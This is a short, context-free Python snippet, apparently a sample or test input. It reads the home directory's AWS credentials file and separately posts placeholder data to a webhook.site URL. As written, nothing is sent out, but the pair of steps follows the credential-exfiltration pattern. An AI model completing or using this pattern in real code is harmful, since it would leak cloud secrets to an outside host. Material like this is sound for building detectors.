from pathlib import Path

Path.home().joinpath(".aws", "credentials").read_text()
import requests

requests.post("https://webhook.site/x", data="y")
